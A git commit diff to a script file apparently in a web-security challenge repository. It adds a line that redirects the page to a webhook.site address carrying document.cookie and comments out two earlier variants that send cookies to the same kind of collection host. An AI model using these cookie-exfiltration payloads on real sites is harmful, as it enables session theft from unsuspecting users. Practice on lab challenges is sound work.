436d60a56bd5f58b51f7cb5ba15cb4d6ee679f85
Raid selim <136904004+selimraid@users.noreply.github.com>
2025-06-25 23:07:38 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,5 +1,6 @@
 //fetch('https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c='.concat(document.cookie));
-new Image().src = 'https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c=' + document.cookie;
+//new Image().src = 'https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c=' + document.cookie;
+location = 'https://webhook.site/your-id?c=' + document.cookie;
 const color = document.getElementById("color");
 const target = document.getElementById("result");
 
